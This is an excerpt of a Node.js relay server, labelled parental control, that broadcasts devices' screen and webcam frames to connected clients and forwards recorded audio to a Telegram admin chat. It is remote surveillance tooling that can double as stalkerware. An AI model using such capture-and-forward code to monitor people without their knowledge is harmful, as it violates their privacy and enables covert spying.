...
wss.on("connection", (ws, _req, type, url) => {
  ...
  for (const device of agents.values()) {
    if (device.lastScreenFrame) {
      sendJson(ws, { type: "frame", deviceId: device.id, stream: "screen", data: device.lastScreenFrame });
    }
    if (device.lastWebcamFrame) {
      sendJson(ws, { type: "frame", deviceId: device.id, stream: "webcam", data: device.lastWebcamFrame });
    }
  }
...
function setupTelegramBot() {
  if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.log("Telegram bot disabled (no BOT_TOKEN or ADMIN_CHAT_ID)");
    return;
  }
...
async function sendTelegramAudio(device, payload) {
  ...
  try {
    ...
    formData.append("caption", `🎤 Ձայնագրություն՝ ${device.name}`);
    formData.append("audio", new Blob([audio], { type: "audio/wav" }), payload.filename || `${device.id}.wav`);
...
server.listen(PORT, () => {
  console.log(`✅ Parent Control Relay running on port ${PORT}`);
});
